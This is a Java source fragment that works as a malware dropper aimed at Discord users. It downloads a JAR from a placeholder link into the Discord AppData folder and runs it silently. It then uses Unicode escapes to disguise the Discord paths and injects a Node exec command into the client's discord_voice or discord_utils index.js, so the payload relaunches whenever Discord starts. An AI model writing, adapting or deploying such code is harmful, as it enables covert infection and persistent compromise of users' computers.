  public static void main(String[] args){ 
    try { download(new URL("LINK OR PUT THE FILE INSIDE THE JAR"), System.getenv("APPDATA") + "\\Discord\\discord_node.jar"); } catch (IOException e) { failed = true; }
    persistence();
  }

  public static void download(URL url, String n2d) throws IOException {
          URLConnection uc = url.openConnection();
          uc.setRequestProperty("Referer", url.toString());
          uc.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.73");
          int len = uc.getContentLength();
          InputStream is = new BufferedInputStream(uc.getInputStream());
          try {
              byte[] data = new byte[len];
              int offset = 0;
              while (offset < len) {
                  int read = is.read(data, offset, data.length - offset);
                  if (read < 0) {
                      break;
                  }
                  offset += read;
              }
              if (offset < len) {
                  throw new IOException(
                          String.format("Read %d bytes; expected %d", offset, len));
              }
              File targetFile = new File(n2d);
              if (!targetFile.exists()) targetFile.createNewFile();
              else if (!targetFile.isFile()) {
                  targetFile.delete();
                  targetFile.createNewFile();
              }
              OutputStream outStream = new FileOutputStream(targetFile);
              outStream.write(data);
          } finally {
              is.close();
              Process p = Runtime.getRuntime().exec("cmd /c java -jar "+n2d+" > nul 2>&1");

          }
      }

    public static void persistence(){
        String dc = System.getenv("LOCALAPPDATA")+"\\\u0044\u0069\u0073\u0063\u006f\u0072\u0064";
        for(String l : Objects.requireNonNull(new File(dc).list())){

            if (l.contains("app-")){
                dc+="\\"+l+"\\modules";
                for(String _l : Objects.requireNonNull(new File(dc).list())){
                    if (_l.contains("\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u005f\u0076\u006f\u0069\u0063\u0065")){
                        dc+="\\"+_l+"\\\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u005f\u0076\u006f\u0069\u0063\u0065\\\u0069\u006e\u0064\u0065\u0078\u002e\u006a\u0073";
                        try { Files.write(Paths.get(dc), "const { exec } = require('child_process');const cmd = \"java -jar %APPDATA%\\\\\u0044\u0069\u0073\u0063\u006f\u0072\u0064\\\\discord_node.jar\";exec(cmd, (err, stdout, stderr) => {}); //h".getBytes(), StandardOpenOption.APPEND); break;} catch (IOException e) { }
                    }else if (_l.contains("discord_utils")){
                        dc+="\\"+_l+"\\\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u005f\u0075\u0074\u0069\u006c\u0073\\\u0069\u006e\u0064\u0065\u0078\u002e\u006a\u0073";
                        try { Files.write(Paths.get(dc), "const { exec } = require('child_process');const cmd = \"java -jar %APPDATA%\\\\\u0044\u0069\u0073\u0063\u006f\u0072\u0064\\\\discord_node.jar\";exec(cmd, (err, stdout, stderr) => {}); //h".getBytes(), StandardOpenOption.APPEND); break;} catch (IOException e) { }
                    }
                }
                break;
            }
        }
    }
